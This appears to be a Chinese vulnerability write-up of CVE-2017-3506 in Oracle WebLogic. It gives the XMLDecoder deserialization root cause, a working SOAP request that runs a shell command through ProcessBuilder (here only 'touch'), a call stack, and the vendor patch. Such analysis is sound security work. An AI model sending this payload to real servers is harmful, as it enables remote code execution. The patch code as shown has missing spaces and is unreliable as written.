# CVE-2017–3506-Weblogic SOAP XMLDecoder 反序列化漏洞

## 漏洞原理

此漏洞点在weblogic.wsee.workarea.WorkContextXmlInputAdapter#readUTF方法，对于传入的XMLDecoder对象的数据未进行过滤，从而调用任意类执行任意方法

## 漏洞复现

payload

```
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: 192.168.8.139:7001
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: text/xml
Content-Length: 767

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
      <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
          <java>
            <object class="java.lang.ProcessBuilder">
              <array class="java.lang.String" length="3">
                <void index="0">
                  <string>/bin/bash</string>
					</void>
					<void index="1">
						<string>-c</string>
					</void>
					<void index="2">
						<string>touch /tmp/CVE-2017-3506</string>
					</void>
              </array>
              <void method="start"/>
            </object>
          </java>
        </work:WorkContext>
      </soapenv:Header>
      <soapenv:Body/>
    </soapenv:Envelope>
```

## 漏洞分析

**调试**

 在weblogic.wsee.workarea.WorkContextXmlInputAdapter#readUTF方法内下断点，发送payload即触发断点

**调用栈**

```java
readObject:203, XMLDecoder (java.beans)
readUTF:111, WorkContextXmlInputAdapter (weblogic.wsee.workarea)
readEntry:92, WorkContextEntryImpl (weblogic.workarea.spi)
receiveRequest:179, WorkContextLocalMap (weblogic.workarea)
receiveRequest:163, WorkContextMapImpl (weblogic.workarea)
receive:71, WorkContextServerTube (weblogic.wsee.jaxws.workcontext)
readHeaderOld:107, WorkContextTube (weblogic.wsee.jaxws.workcontext)
processRequest:43, WorkContextServerTube (weblogic.wsee.jaxws.workcontext)
```

## 修复补丁

补丁对SOAP数据中xml数据标签进行校验，限制了object标签的使用

```java
private void validate(InputStream is) {

      WebLogicSAXParserFactoryfactory = new WebLogicSAXParserFactory();

      try {

         SAXParser parser =factory.newSAXParser();

         parser.parse(is, newDefaultHandler() {

            public void startElement(String uri, StringlocalName, String qName, Attributes attributes) throws SAXException {

               if(qName.equalsIgnoreCase("object")) {

                  throw newIllegalStateException("Invalid context type: object");

               }

            }

         });

      } catch(ParserConfigurationException var5) {

         throw newIllegalStateException("Parser Exception", var5);

      } catch (SAXExceptionvar6) {

         throw newIllegalStateException("Parser Exception", var6);

      } catch (IOExceptionvar7) {

         throw newIllegalStateException("Parser Exception", var7);

      }

   }
```



## 参考

https://xz.aliyun.com/t/1849
